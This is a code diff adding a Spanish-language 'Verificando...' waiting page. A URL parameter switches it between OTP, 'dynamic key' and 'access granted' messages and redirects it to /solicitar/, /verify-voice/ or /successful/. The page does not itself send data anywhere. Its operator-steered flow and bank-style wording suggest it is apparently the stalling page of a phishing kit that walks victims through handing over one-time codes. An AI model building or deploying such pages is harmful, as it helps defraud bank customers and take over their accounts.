@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verificando...</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {background:#742fe1;color:white;text-align:center;padding:100px;font-family:Arial;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center}
+        .loader {border:16px solid #fff;border-top:16px solid #ff6b6b;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;margin:30px auto}
+        @keyframes spin {0% {transform:rotate(0deg)}100% {transform:rotate(360deg)}}
+    </style>
+</head>
+<body>
+    <h1>Verificando...</h1>
+    <p>Espera mientras aprobamos tu acceso...</p>
+    <div class="loader"></div>
+
+    <script>
+    const url = new URL(location.href);
+    const doAction = url.searchParams.get('do');
+    if (doAction) {
+        const msgs = {
+            otp: ['Tu clave OTP es: 4821', '/solicitar/'],
+            dinamica: ['Pide la clave dinámica', '/verify-voice/'],
+            ok: ['Acceso concedido!', '/successful/']
+        };
+        const [msg, to] = msgs[doAction] || ['Acción desconocida', '/'];
+        document.body.innerHTML = `<h1>${msg}</h1><p>Redirigiendo...</p><div class="loader"></div>`;
+        setTimeout(() => location.href = to, 2000);
+    }
+    </script>
+</body>
+</html>
